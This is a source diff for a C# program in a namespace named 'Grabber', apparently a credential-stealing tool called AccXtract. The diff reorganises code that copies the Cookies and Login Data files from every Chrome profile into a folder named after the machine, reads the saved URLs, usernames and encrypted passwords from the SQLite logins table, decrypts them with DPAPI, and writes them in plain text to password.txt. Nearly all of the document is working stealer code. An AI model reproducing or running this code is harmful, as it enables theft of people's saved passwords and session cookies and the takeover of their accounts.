@@ -33,14 +33,27 @@ namespace Grabber
             string cd = Directory.GetCurrentDirectory();
             string home = Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%");
 
-            cd += "\\AccXtract";
+            cd += "\\AccXtract\\" + Environment.MachineName;
+
+            grabChromeData(cd, home);
+            decryptChromePasswords(cd, home);
+            
+        }
 
 
-            #region Chrome cookies
+        static void grabChromeData(string cd, string home)
+        {
             if (Directory.Exists(home + @"\AppData\Local\Google\Chrome"))
             {
 
-                Directory.CreateDirectory(cd + "\\" + System.Environment.MachineName + "\\Chrome\\Default");
+                Directory.CreateDirectory(cd + "\\Chrome\\Default");
+
+                //Default's cookies
+                File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\Default\Cookies", cd + "\\Chrome\\Default\\cookies", true);
+
+                //Default's encrypted login data
+                File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data", cd + "\\Chrome\\Default\\Login Data", true);
+
 
                 string chromePath = home + @"\AppData\Local\Google\Chrome\User Data\";
 
@@ -71,14 +84,16 @@ namespace Grabber
                     }
                 }
 
-                File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\Default\Cookies", cd + "\\" + System.Environment.MachineName + "\\Chrome\\Default\\cookies", true);
-
-                //list.RemoveAt(0);
-
                 while (list.Count != 0)
                 {
-                    Directory.CreateDirectory(cd + "\\" + System.Environment.MachineName + "\\Chrome\\" + list[1]);
-                    File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\" + list[0] + "\\Cookies", cd + "\\" + System.Environment.MachineName + "\\Chrome\\" + list[1] + "\\cookies", true);
+                    Directory.CreateDirectory(cd + "\\Chrome\\" + list[1]);
+
+                    //cookies
+                    File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\" + list[0] + "\\Cookies", cd + "\\Chrome\\" + list[1] + "\\Cookies", true);
+
+                    //encrypted login data
+                    File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\" + list[0] + "\\Login Data", cd + "\\Chrome\\" + list[1] + "\\Login Data", true);
+
 
                     list.RemoveAt(0);
                     list.RemoveAt(0);
@@ -86,49 +101,47 @@ namespace Grabber
 
                 file.Close();
             }
-            #endregion
+        }
 
+        static void decryptChromePasswords(string cd, string home)
+        {
+            cd += "\\Chrome";
 
-            #region Chrome Passwords
-
-            string copiedLoginData = cd + "\\Login Data";
-            File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data", copiedLoginData, true);
-
-            SQLiteConnection conn = new SQLiteConnection("Data Source=" + copiedLoginData);
-
-            conn.Open();
-
-            SQLiteCommand retrieveData = conn.CreateCommand();
-            retrieveData.CommandText = "SELECT action_url, username_value, password_value FROM logins";
-            SQLiteDataReader data = retrieveData.ExecuteReader();
-
-            List<string> decryptedData = new List<string>();
-            while (data.Read())
+            foreach (string profile in Directory.GetDirectories(cd))
             {
-                byte[] bytes = (byte[])data["password_value"];
-                //byte[] outBytes = DPAPI.Decrypt(bytes, null, out outstring);
+                SQLiteConnection conn = new SQLiteConnection("Data Source=" + profile + "\\Login Data");
 
-                byte[] outBytes = DPAPI.decryptBytes(bytes);
+                conn.Open();
 
-                string url = (string)data["action_url"];
-                string username = (string)data["username_value"];
-                string password = Encoding.Default.GetString(outBytes);
+                SQLiteCommand retrieveData = conn.CreateCommand();
+                retrieveData.CommandText = "SELECT action_url, username_value, password_value FROM logins";
+                SQLiteDataReader data = retrieveData.ExecuteReader();
 
-                if (password != "")
+                List<string> decryptedData = new List<string>();
+                while (data.Read())
                 {
-                    decryptedData.Add(url);
-                    decryptedData.Add(username);
-                    decryptedData.Add(password);
+                    string url = (string)data["action_url"];
+                    string username = (string)data["username_value"];
+                    string decryptedPassword = "";
+
+                    byte[] encryptedPassword = (byte[])data["password_value"];
+
+                    byte[] outBytes = DPAPI.decryptBytes(encryptedPassword);
+
+                    decryptedPassword = Encoding.Default.GetString(outBytes);
+
+                    if (decryptedPassword != "")
+                    {
+                        decryptedData.Add(url);
+                        decryptedData.Add(username);
+                        decryptedData.Add(decryptedPassword);
+                    }
                 }
+
+                File.WriteAllLines(profile + "\\password.txt", decryptedData.ToArray());
+
+                conn.Close();
             }
-
-            Directory.CreateDirectory(cd + "\\" + System.Environment.MachineName + "\\Chrome\\Default");
-            File.WriteAllLines(cd + "\\" + System.Environment.MachineName + "\\password.txt", decryptedData.ToArray());
-
-            conn.Close();
-            conn.Dispose();
-
-            #endregion
         }
     }
 }
